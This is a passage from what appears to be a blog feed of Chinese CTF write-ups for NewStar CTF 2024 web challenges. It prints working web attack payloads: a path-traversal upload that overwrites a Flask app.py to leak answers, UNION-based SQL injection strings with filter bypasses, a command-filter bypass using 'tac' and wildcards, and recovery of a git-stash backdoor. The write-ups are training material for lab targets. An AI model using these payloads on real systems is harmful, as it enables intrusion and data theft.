class="hljs-comment"># 找到全0的平方差</span><br>    <span class="hljs-built_in">print</span>(scores1)<br>    <span class="hljs-built_in">print</span>(scores2)<br>    <span class="hljs-built_in">print</span>(all_zero_score)<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    payload = [<span class="hljs-number">0</span>]*<span class="hljs-number">500</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>            payload[j] = i<br>            scores1 = send(<span class="hljs-built_in">str</span>(payload))<br>            score = find_new_score (scores1, scores2)<br>            <span class="hljs-keyword">if</span> score == all_zero_score - i*i:<br>                flag += <span class="hljs-built_in">chr</span>(i+<span class="hljs-number">65</span>)<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>但是flag提交上去显示答案错误。因为在 flask 代码中做了「归一化」的操作：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> idx, <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(answers):<br>    <span class="hljs-keyword">if</span> <span class="hljs-selector-tag">i</span> &lt; <span class="hljs-number">0</span>:<br>        answers<span class="hljs-selector-attr">[idx]</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>重新审题。题目中有提示：助教部署的时候偷懒了，直接用了 <code>flask run</code>（当然了，助教也读过 Flask 的文档，所以 DEBUG 是关了的）。而且有的时候助教想改改代码，又懒得手动重启，所以还开了 <code>--reload</code>。启动的<strong>完整命令</strong>为 <code>flask run --reload --host 0</code>。网站代码运行在 <code>/tmp/web</code>。</p><p>在使用 Flask 时，<code>app.py</code> 通常是 Flask 应用的主文件。这道题的关键是服务器的后端使用了<code>flask run --reload --host 0</code>命令运行，并开启了<code>--reload</code>选项，那么如果有文件换掉了<code>app.py</code>，flask会马上应用新的脚本。所以在源代码中写一个读取并返回<code>answer.json</code>的route，然后上传替换掉原本的 <code>app.py</code> 即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(): <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;answers.json&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>answers = json.load(f)<br><span class="hljs-keyword">return</span> answers<br></code></pre></td></tr></table></figure><p>上传文件的目录是 <code>/tmp/uploads</code> ，题干又特意提示了网站目录在 <code>/tmp/web</code>，想到路径穿越漏洞。上传文件的时候，给文件名前加上<code>../</code>就可以穿透目录，上传到任意的地方去。BurpSuite抓包，修改传输路径为<code>../web/app.py</code>。</p><p><img src="/../images/Pasted%20image%2020241111134142.png"></p><p>访问&#x2F;flag：<br><img src="/../images/Pasted%20image%2020241111134241.png"></p><p>对应的数字加 65 后使用 ASCII 编码转换：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">a</span>=[<span class="hljs-number">37</span>,<span class="hljs-number">43</span>,<span class="hljs-number">32</span>,<span class="hljs-number">38</span>,<span class="hljs-number">58</span>,<span class="hljs-number">52</span>,<span class="hljs-number">45</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,<span class="hljs-number">30</span>,<span class="hljs-number">36</span>,<span class="hljs-number">50</span>,<span class="hljs-number">49</span>,<span class="hljs-number">36</span>,<span class="hljs-number">53</span>,<span class="hljs-number">36</span>,<span class="hljs-number">49</span>,<span class="hljs-number">30</span>,<span class="hljs-number">45</span>,<span class="hljs-number">46</span>,<span class="hljs-number">54</span>,<span class="hljs-number">30</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">49</span>,<span class="hljs-number">52</span>,<span class="hljs-number">45</span>,<span class="hljs-number">30</span>,<span class="hljs-number">12</span>,<span class="hljs-number">24</span>,<span class="hljs-number">30</span>,<span class="hljs-number">34</span>,-<span class="hljs-number">17</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,-<span class="hljs-number">17</span>,-<span class="hljs-number">16</span>,-<span class="hljs-number">14</span>,<span class="hljs-number">32</span>,-<span class="hljs-number">10</span>,<span class="hljs-number">33</span>,-<span class="hljs-number">8</span>,<span class="hljs-number">36</span>,-<span class="hljs-number">17</span>,<span class="hljs-number">60</span>,<span class="hljs-number">56</span>,<span class="hljs-number">38</span>,<span class="hljs-number">37</span>,<span class="hljs-number">79</span>,<span class="hljs-number">59</span>,<span class="hljs-number">9</span>,<span class="hljs-number">33</span>,<span class="hljs-number">88</span>,<span class="hljs-number">72</span>,<span class="hljs-number">58</span>,<span class="hljs-number">80</span>,<span class="hljs-number">17</span>,<span class="hljs-number">3</span>,<span class="hljs-number">81</span>,<span class="hljs-number">17</span>,<span class="hljs-number">87</span>,<span class="hljs-number">89</span>,<span class="hljs-number">34</span>,<span class="hljs-number">74</span>,<span class="hljs-number">92</span>,<span class="hljs-number">25</span>,<span class="hljs-number">76</span>,<span class="hljs-number">38</span>,<span class="hljs-number">98</span>,<span class="hljs-number">15</span>,<span class="hljs-number">18</span>,<span class="hljs-number">45</span>,<span class="hljs-number">41</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">4</span>,<span class="hljs-number">17</span>,<span class="hljs-number">94</span>,<span class="hljs-number">9</span>,<span class="hljs-number">99</span>,<span class="hljs-number">87</span>,<span class="hljs-number">65</span>,<span class="hljs-number">35</span>,<span class="hljs-number">73</span>,<span class="hljs-number">63</span>,<span class="hljs-number">50</span>,<span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">95</span>,<span class="hljs-number">27</span>,<span class="hljs-number">35</span>,<span class="hljs-number">9</span>,<span class="hljs-number">27</span>,<span class="hljs-number">13</span>,<span class="hljs-number">62</span>,<span class="hljs-number">32</span>,<span class="hljs-number">84</span>,<span class="hljs-number">34</span>,<span class="hljs-number">76</span>,<span class="hljs-number">43</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">78</span>,<span class="hljs-number">33</span>,<span class="hljs-number">1</span>,<span class="hljs-number">24</span>,<span class="hljs-number">83</span>,<span class="hljs-number">58</span>,<span class="hljs-number">98</span>,<span class="hljs-number">62</span>,<span class="hljs-number">6</span>,<span class="hljs-number">88</span>,<span class="hljs-number">76</span>,<span class="hljs-number">32</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">54</span>,<span class="hljs-number">35</span>,<span class="hljs-number">69</span>,<span class="hljs-number">62</span>,<span class="hljs-number">74</span>,<span class="hljs-number">71</span>,<span class="hljs-number">20</span>,<span class="hljs-number">71</span>,<span class="hljs-number">67</span>,<span class="hljs-number">53</span>,<span class="hljs-number">30</span>,<span class="hljs-number">49</span>,<span class="hljs-number">99</span>,<span class="hljs-number">94</span>,<span class="hljs-number">69</span>,<span class="hljs-number">7</span>,<span class="hljs-number">47</span>,<span class="hljs-number">97</span>,<span class="hljs-number">94</span>,<span class="hljs-number">96</span>,<span class="hljs-number">67</span>,<span class="hljs-number">43</span>,<span class="hljs-number">40</span>,<span class="hljs-number">66</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">88</span>,<span class="hljs-number">67</span>,<span class="hljs-number">10</span>,<span class="hljs-number">73</span>,<span class="hljs-number">20</span>,<span class="hljs-number">91</span>,<span class="hljs-number">10</span>,<span class="hljs-number">90</span>,<span class="hljs-number">99</span>,<span class="hljs-number">87</span>,<span class="hljs-number">65</span>,<span class="hljs-number">32</span>,<span class="hljs-number">81</span>,<span class="hljs-number">3</span>,<span class="hljs-number">80</span>,<span class="hljs-number">41</span>,<span class="hljs-number">67</span>,<span class="hljs-number">40</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">14</span>,<span class="hljs-number">97</span>,<span class="hljs-number">97</span>,<span class="hljs-number">19</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">76</span>,<span class="hljs-number">24</span>,<span class="hljs-number">57</span>,<span class="hljs-number">47</span>,<span class="hljs-number">77</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">79</span>,<span class="hljs-number">1</span>,<span class="hljs-number">48</span>,<span class="hljs-number">55</span>,<span class="hljs-number">0</span>,<span class="hljs-number">20</span>,<span class="hljs-number">72</span>,<span class="hljs-number">49</span>,<span class="hljs-number">84</span>,<span class="hljs-number">4</span>,<span class="hljs-number">83</span>,<span class="hljs-number">4</span>,<span class="hljs-number">70</span>,<span class="hljs-number">16</span>,<span class="hljs-number">55</span>,<span class="hljs-number">37</span>,<span class="hljs-number">77</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">43</span>,<span class="hljs-number">20</span>,<span class="hljs-number">46</span>,<span class="hljs-number">81</span>,<span class="hljs-number">12</span>,<span class="hljs-number">81</span>,<span class="hljs-number">59</span>,<span class="hljs-number">14</span>,<span class="hljs-number">23</span>,<span class="hljs-number">32</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">88</span>,<span class="hljs-number">44</span>,<span class="hljs-number">44</span>,<span class="hljs-number">11</span>,<span class="hljs-number">76</span>,<span class="hljs-number">92</span>,<span class="hljs-number">4</span>,<span class="hljs-number">21</span>,<span class="hljs-number">21</span>,<span class="hljs-number">92</span>,<span class="hljs-number">31</span>,<span class="hljs-number">89</span>,<span class="hljs-number">100</span>,<span class="hljs-number">78</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">22</span>,<span class="hljs-number">84</span>,<span class="hljs-number">60</span>,<span class="hljs-number">28</span>,<span class="hljs-number">22</span>,<span class="hljs-number">66</span>,<span class="hljs-number">32</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">87</span>,<span class="hljs-number">16</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">69</span>,<span class="hljs-number">29</span>,<span class="hljs-number">77</span>,<span class="hljs-number">58</span>,<span class="hljs-number">77</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">65</span>,<span class="hljs-number">36</span>,<span class="hljs-number">95</span>,<span class="hljs-number">71</span>,<span class="hljs-number">68</span>,<span class="hljs-number">57</span>,<span class="hljs-number">44</span>,<span class="hljs-number">56</span>,<span class="hljs-number">65</span>,<span class="hljs-number">69</span>,<span class="hljs-number">73</span>,<span class="hljs-number">83</span>,<span class="hljs-number">55</span>,<span class="hljs-number">8</span>,<span class="hljs-number">93</span>,<span class="hljs-number">18</span>,<span class="hljs-number">38</span>,<span class="hljs-number">98</span>,<span class="hljs-number">5</span>,<span class="hljs-number">24</span>,<span class="hljs-number">33</span>,<span class="hljs-number">52</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">66</span>,<span class="hljs-number">58</span>,<span class="hljs-number">61</span>,<span class="hljs-number">83</span>,<span class="hljs-number">78</span>,<span class="hljs-number">36</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">41</span>,<span class="hljs-number">48</span>,<span class="hljs-number">71</span>,<span class="hljs-number">56</span>,<span class="hljs-number">83</span>,<span class="hljs-number">40</span>,<span class="hljs-number">90</span>,<span class="hljs-number">47</span>,<span class="hljs-number">67</span>,<span class="hljs-number">75</span>,<span class="hljs-number">13</span>,<span class="hljs-number">46</span>,<span class="hljs-number">13</span>,<span class="hljs-number">39</span>,<span class="hljs-number">60</span>,<span class="hljs-number">92</span>,<span class="hljs-number">58</span>,<span class="hljs-number">91</span>,<span class="hljs-number">42</span>,<span class="hljs-number">66</span>,<span class="hljs-number">54</span>,<span class="hljs-number">76</span>,<span class="hljs-number">100</span>,<span class="hljs-number">24</span>,<span class="hljs-number">66</span>,<span class="hljs-number">48</span>,<span class="hljs-number">35</span>,<span class="hljs-number">31</span>,<span class="hljs-number">5</span>,<span class="hljs-number">56</span>,<span class="hljs-number">80</span>,<span class="hljs-number">58</span>,<span class="hljs-number">91</span>,<span class="hljs-number">21</span>,<span class="hljs-number">9</span>,<span class="hljs-number">25</span>,<span class="hljs-number">5</span>,<span class="hljs-number">25</span>,<span class="hljs-number">10</span>,<span class="hljs-number">55</span>,<span class="hljs-number">5</span>,<span class="hljs-number">47</span>,<span class="hljs-number">30</span>,<span class="hljs-number">77</span>,<span class="hljs-number">86</span>,<span class="hljs-number">91</span>,<span class="hljs-number">5</span>,<span class="hljs-number">51</span>,<span class="hljs-number">37</span>,<span class="hljs-number">54</span>,<span class="hljs-number">47</span>,<span class="hljs-number">91</span>,<span class="hljs-number">34</span>,<span class="hljs-number">11</span>,<span class="hljs-number">56</span>,<span class="hljs-number">34</span>,<span class="hljs-number">93</span>,<span class="hljs-number">94</span>,<span class="hljs-number">64</span>,<span class="hljs-number">14</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">88</span>,<span class="hljs-number">53</span>,<span class="hljs-number">12</span>,<span class="hljs-number">69</span>,<span class="hljs-number">89</span>,<span class="hljs-number">31</span>,<span class="hljs-number">66</span>,<span class="hljs-number">6</span>,<span class="hljs-number">33</span>,<span class="hljs-number">2</span>,<span class="hljs-number">36</span>,<span class="hljs-number">32</span>,<span class="hljs-number">30</span>,<span class="hljs-number">82</span>,<span class="hljs-number">27</span>,<span class="hljs-number">35</span>,<span class="hljs-number">91</span>,<span class="hljs-number">31</span>,<span class="hljs-number">55</span>,<span class="hljs-number">92</span>,<span class="hljs-number">67</span>,<span class="hljs-number">25</span>,<span class="hljs-number">71</span>,<span class="hljs-number">68</span>,<span class="hljs-number">26</span>,<span class="hljs-number">31</span>,<span class="hljs-number">89</span>,<span class="hljs-number">27</span>,<span class="hljs-number">60</span>,<span class="hljs-number">72</span>,<span class="hljs-number">1</span>,<span class="hljs-number">82</span>,<span class="hljs-number">68</span>,<span class="hljs-number">32</span>,<span class="hljs-number">7</span>,<span class="hljs-number">65</span>,<span class="hljs-number">14</span>,<span class="hljs-number">19</span>,<span class="hljs-number">59</span>,<span class="hljs-number">34</span>,<span class="hljs-number">85</span>,<span class="hljs-number">99</span>,<span class="hljs-number">21</span>,<span class="hljs-number">82</span>,<span class="hljs-number">27</span>,<span class="hljs-number">86</span>,<span class="hljs-number">31</span>,<span class="hljs-number">19</span>,<span class="hljs-number">10</span>,<span class="hljs-number">21</span>,<span class="hljs-number">53</span>,<span class="hljs-number">77</span>,<span class="hljs-number">38</span>,<span class="hljs-number">43</span>,<span class="hljs-number">48</span>,<span class="hljs-number">55</span>,<span class="hljs-number">41</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">67</span>,<span class="hljs-number">1</span>,<span class="hljs-number">40</span>,<span class="hljs-number">74</span>,<span class="hljs-number">16</span>,<span class="hljs-number">34</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">34</span>,<span class="hljs-number">53</span>,<span class="hljs-number">1</span>,<span class="hljs-number">43</span>,<span class="hljs-number">61</span>,<span class="hljs-number">22</span>,<span class="hljs-number">81</span>,<span class="hljs-number">50</span>,<span class="hljs-number">28</span>,<span class="hljs-number">72</span>,<span class="hljs-number">5</span>,<span class="hljs-number">19</span>,<span class="hljs-number">80</span>,<span class="hljs-number">81</span>,<span class="hljs-number">69</span>,<span class="hljs-number">87</span>,<span class="hljs-number">25</span>,<span class="hljs-number">42</span>,<span class="hljs-number">97</span>,<span class="hljs-number">15</span>,<span class="hljs-number">52</span>,<span class="hljs-number">80</span>,<span class="hljs-number">93</span>,<span class="hljs-number">16</span>,<span class="hljs-number">34</span>,<span class="hljs-number">1</span>,<span class="hljs-number">37</span>,<span class="hljs-number">2</span>,<span class="hljs-number">62</span>,<span class="hljs-number">59</span>,<span class="hljs-number">13</span>,<span class="hljs-number">53</span>,<span class="hljs-number">93</span>,<span class="hljs-number">87</span>,<span class="hljs-number">78</span>,<span class="hljs-number">30</span>,<span class="hljs-number">50</span>,<span class="hljs-number">46</span>,<span class="hljs-number">79</span>,<span class="hljs-number">50</span>,<span class="hljs-number">40</span>,<span class="hljs-number">70</span>,<span class="hljs-number">29</span>,<span class="hljs-number">29</span>,<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,<span class="hljs-number">47</span>,<span class="hljs-number">81</span>,<span class="hljs-number">29</span>,<span class="hljs-number">71</span>,<span class="hljs-number">55</span>,<span class="hljs-number">46</span>,<span class="hljs-number">83</span>,<span class="hljs-number">79</span>,<span class="hljs-number">99</span>,<span class="hljs-number">3</span>,<span class="hljs-number">32</span>,<span class="hljs-number">85</span>,<span class="hljs-number">35</span>,<span class="hljs-number">0</span>,<span class="hljs-number">40</span>,<span class="hljs-number">79</span>,<span class="hljs-number">77</span>,<span class="hljs-number">85</span>,<span class="hljs-number">77</span>,<span class="hljs-number">9</span>,<span class="hljs-number">96</span>,<span class="hljs-number">74</span>,<span class="hljs-number">7</span>,<span class="hljs-number">78</span>,<span class="hljs-number">28</span>,<span class="hljs-number">11</span>,<span class="hljs-number">83</span>,<span class="hljs-number">3</span>,<span class="hljs-number">24</span>,<span class="hljs-number">46</span>,<span class="hljs-number">94</span>,<span class="hljs-number">45</span>,<span class="hljs-number">11</span>,<span class="hljs-number">20</span>,<span class="hljs-number">95</span>,<span class="hljs-number">10</span>,<span class="hljs-number">75</span>,<span class="hljs-number">66</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">69</span>,<span class="hljs-number">32</span>,<span class="hljs-number">55</span>,<span class="hljs-number">29</span>,<span class="hljs-number">88</span>]<br><br><span class="hljs-attribute">for</span> num in a:<br>    <span class="hljs-attribute">char</span> = chr(num + <span class="hljs-number">65</span>)<br>    <span class="hljs-attribute">flag</span> += char<br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241111141350.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/../images/Pasted%20image%2020241103121215.png&quot;&gt;&lt;br&gt;&lt;img src</summary>
      
    
    
    
    
    <category term="CTF刷题记录" scheme="http://example.com/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>NewStar-CTF-2024-Week2-Web</title>
    <link href="http://example.com/2024/10/27/NewStar-CTF-2024-Week2-Web/"/>
    <id>http://example.com/2024/10/27/NewStar-CTF-2024-Week2-Web/</id>
    <published>2024-10-27T05:30:20.000Z</published>
    <updated>2024-12-09T08:33:31.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="你能在一秒内打出八句英文吗"><a href="#你能在一秒内打出八句英文吗" class="headerlink" title="你能在一秒内打出八句英文吗"></a>你能在一秒内打出八句英文吗</h1><p>经典脚本题，思路：先获取页面中需要输入的英文文本，再提交你获得的的文本。<br><img src="/../images/Pasted%20image%2020241027150120.png"><br><code>&lt;p id=&#39;text&#39;&gt;</code> 是一个 HTML 标签，它表示一个段落元素（<code>&lt;p&gt;</code>）并且带有一个 ID 属性，值为 <code>text</code></p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">import requests<br><span class="hljs-keyword">from</span> bs4 import BeautifulSoup<br><br><span class="hljs-comment"># 创建会话</span><br>session = requests.Session()<br><br><span class="hljs-comment"># 目标 URL</span><br>start_url = <span class="hljs-string">&quot;http://eci-2ze28vznmioh0zpy19h2.cloudeci1.ichunqiu.com/start&quot;</span><br>submit_url = <span class="hljs-string">&quot;http://eci-2ze28vznmioh0zpy19h2.cloudeci1.ichunqiu.com/submit&quot;</span>  # 修改为实际提交的 URL<br><br><span class="hljs-comment"># 获取页面内容</span><br>response = session.<span class="hljs-built_in">get</span>(start_url)<br><span class="hljs-keyword">if</span> response.status_code == 200:<br>    soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    # 解析 HTTP 响应中的 HTML 内容<br>    # html.parser 是 Python 内置的解析器<br><br>    # 由于需要的英文文本在 &lt;p <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;text&#x27;</span>&gt; 标签中<br>    text_element = soup.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;text&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> text_element:<br>        value = text_element.get_text()<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;获取到的文本：&#123;value&#125;&quot;</span>)<br>        # 创建payload字典<br>        payload = &#123;<span class="hljs-string">&#x27;user_input&#x27;</span>: value&#125;<br>        # 由源代码可知，<span class="hljs-string">&#x27;user_input&#x27;</span> 是服务器端所期望接收的参数名称<br>        post_response = session.post(submit_url, data = payload)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提交后的响应：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(post_response.text)<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241027154023.png"></p><p>在 Python 的 <code>requests</code> 库中，<code>r.content</code> 和 <code>r.text</code> 是用于获取 HTTP 响应内容的两种方式，它们的区别在于数据类型和编码方式：<br>**<code>r.content</code>**：</p><ul><li><strong>数据类型</strong>：<code>bytes</code> 类型，即<strong>字节流</strong>。</li><li><strong>用途</strong>：适用于处理非文本数据（如图片、视频、PDF 文件等）或需要进行特定编码处理的文本。</li><li><strong>示例</strong>：<code>r.content</code> 可以直接获取原始的二进制响应内容，如果要保存文件或手动解码可以使用它。</li></ul><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">response = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;https://example.com/image.jpg&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;image.jpg&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(response.content)<br></code></pre></td></tr></table></figure><p>**<code>r.text</code>**：</p><ul><li><strong>数据类型</strong>：<code>str</code> 类型，即<strong>Unicode 文本</strong>。</li><li><strong>用途</strong>：适用于文本数据，例如 HTML、JSON、XML 等。<code>requests</code> 会根据响应的 <code>encoding</code> 自动解码为 Unicode。</li><li><strong>示例</strong>：<code>r.text</code> 可直接用于解析文本响应内容，例如解析 JSON 响应。</li></ul><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">response = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;https://example.com/data&quot;</span>)<br><span class="hljs-built_in">print</span>(response.text)  # 打印文本内容<br></code></pre></td></tr></table></figure><h1 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h1><p>提示：拉链的英文是 zip，这里是考的 <code>www.zip</code> 泄露<br>dirsearch扫描网站目录。</p><p><img src="/../images/Pasted%20image%2020241027161555.png"></p><p>访问<a href="https://eci-2zeirp9f80ax1v9sfvhd.cloudeci1.ichunqiu.com/www.zip%EF%BC%8C%E4%B8%8B%E8%BD%BD">https://eci-2zeirp9f80ax1v9sfvhd.cloudeci1.ichunqiu.com/www.zip，下载</a></p><p><img src="/../images/Pasted%20image%2020241027162111.png"></p><p><strong>数组绕过</strong>：原理是 md5 等函数不能处理数组，导致函数返回null。而null是等于null的，导致了绕过。<br>例如，<code>?new[]=value1</code></p><figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/cat|flag/i&quot;</span>, $cmd)) &#123;<br>    die(<span class="hljs-string">&quot;u can not do this &quot;</span>)<span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-meta"># preg_match函数是一个用于执行正则表达式匹配的函数。它检查 `$cmd` 变量中是否包含特定的模式。</span><br><span class="hljs-meta"># /cat|flag/：表示匹配字符串中是否包含 <span class="hljs-string">&quot;cat&quot;</span> 或 <span class="hljs-string">&quot;flag&quot;</span>。</span><br><span class="hljs-meta"># i修饰符：表示不区分大小写。</span><br></code></pre></td></tr></table></figure><p>命令执行过滤了 <code>cat</code>，使用 <code>tac</code> 代替。<code>flag</code>被过滤，使用 <code>fla*</code> 通配符绕过。</p><p><img src="/../images/Pasted%20image%2020241027173534.png"></p><p>注意分号。</p><h1 id="谢谢皮蛋-plus"><a href="#谢谢皮蛋-plus" class="headerlink" title="谢谢皮蛋 plus"></a>谢谢皮蛋 plus</h1><ol><li>输入2-1和1，回显信息不同，证明是字符型注入。</li><li>接下来判断闭合方式，输入1“报错，说明是双引号。<br><img src="/../images/Pasted%20image%2020241027200035.png"></li><li>输入<code>1&quot; order by 2#</code>，记得注释！<br><img src="/../images/Pasted%20image%2020241027200437.png"><br>判断空格可能被过滤。使用 <code>/**/</code> 替换空格：<code>1&quot;/**/order/**/by/**/2#</code><br>字段数为2。</li><li>爆数据库：异常值+union select两字段#<br><code>-1&quot;/**/union/**/select/**/database(),2#</code><br><img src="/../images/Pasted%20image%2020241027205808.png"></li><li>爆表<br><code>-1&quot;/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#39;ctf&#39;#</code></li><li>爆字段<br><code>-1&quot;/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&#39;ctf&#39;/**/and/**/table_name=&#39;Fl4g&#39;#</code><br><img src="/../images/Pasted%20image%2020241027210807.png"><br>猜测可能是and被过滤，使用&amp;&amp;替换。<br><code>-1&quot;/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&#39;ctf&#39;/**/&amp;&amp;/**/table_name=&#39;Fl4g&#39;#</code></li><li>得到flag。<br><code>-1&quot;/**/union/**/select/**/1,group_concat(des,value)/**/from/**/Fl4g#</code></li></ol><p>这篇文章总结了一些常见的 SQL 注入：<a href="https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/">SQL 注入绕过过滤总结</a>。</p><h1 id="PangBai-过家家（2）"><a href="#PangBai-过家家（2）" class="headerlink" title="PangBai 过家家（2）"></a>PangBai 过家家（2）</h1><p><img src="/../images/Pasted%20image%2020241029140330.png"><br>有泄露的文件，先目录扫描一下。<br><img src="/../images/Pasted%20image%2020241029145033.png"></p><p>发现有git泄露。</p><p>使用 GitHack 工具从 .git 文件夹中泄露文件到本地。</p><p><img src="/../images/Pasted%20image%2020241029151743.png"></p><p>进入dist下生成的文件夹，可以看到恢复的网站源码：</p><p><img src="/../images/Pasted%20image%2020241029152257.png"></p><p>可以使用 git 命令查看当前项目的信息。</p><p>比如使用 <code>git log</code> 查看提交历史。</p><p><img src="/../images/Pasted%20image%2020241029152346.png"></p><p><code>git stash list</code> 查看所有被暂存的修改记录。它会列出当前分支中存储的所有“暂存内容”（stash）。<br><img src="/../images/Pasted%20image%2020241029153410.png"></p><p>可以看到 Stash 中含有后门。</p><p>有时会遇到这样的情况，我们正在 dev 分支开发新功能，做到一半时有人过来反馈一个 bug，让马上解决，但是又不方便和现在已经更改的内容混杂在一起，这时就可以使用 <code>git stash</code> 命令先把当前进度保存起来。随后便可以即时处理当前要处理的内容。使用 <code>git stash pop</code> 则可以将之前存储的内容重新恢复到工作区。又或者，我们已经在一个分支进行了修改，但发现自己修改错了分支，可以通过 Stash 进行存储，然后到其它分支中释放。</p><p>使用 <code>git stash pop</code> 恢复后门文件到工作区。</p><p><img src="/../images/Pasted%20image%2020241029154513.png"></p><p>发现了后门文件 <code>BacKd0or.v2d23AOPpDfEW5Ca.php</code>，访问显示：<br><img src="/../images/Pasted%20image%2020241029154825.png"><br>由于 <code>git stash pop</code> 已经将文件释放了出来，我们可以直接查看后门的源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Functions to handle HTML output</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print_msg</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>) </span>&#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\s*&lt;script.*&lt;\/script&gt;/s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$content</span> = <span 